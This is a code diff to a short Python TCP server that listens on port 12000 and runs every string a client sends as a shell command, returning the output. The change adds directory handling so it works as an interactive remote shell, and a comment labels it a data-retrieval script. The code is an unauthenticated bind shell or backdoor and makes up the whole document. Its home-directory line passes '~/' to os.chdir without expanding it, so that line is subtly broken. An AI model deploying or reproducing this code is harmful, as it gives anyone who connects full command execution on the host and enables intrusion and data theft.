@@ -1,5 +1,6 @@
 from socket import *
 import subprocess
+import os
 
 serverPort = 12000
 serverSocket = socket(AF_INET,SOCK_STREAM) #SOCK_STREAM = TCP
@@ -13,7 +14,20 @@ print ('The server is ready to receive')
 connectionSocket, addr = serverSocket.accept()
 print('Accepted a new client', addr)
 
+
+#script retrieve dati
+
+
 while True:
-    comando = connectionSocket.recv(16536).decode()
-    result = subprocess.run(comando, shell=True, stdout=subprocess.PIPE, encoding='utf-8')
-    connectionSocket.send(result.stdout.encode())    
+    cmd = connectionSocket.recv(16536).decode()
+    if cmd.startswith("cd"):
+        if len(cmd) < 4 :
+            os.chdir("~/")
+        else :
+            os.chdir(cmd[3:])
+        result = os.getcwd()
+    else:    
+        result = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE, encoding='utf-8').stdout
+    connectionSocket.send(result.encode())
+    
+
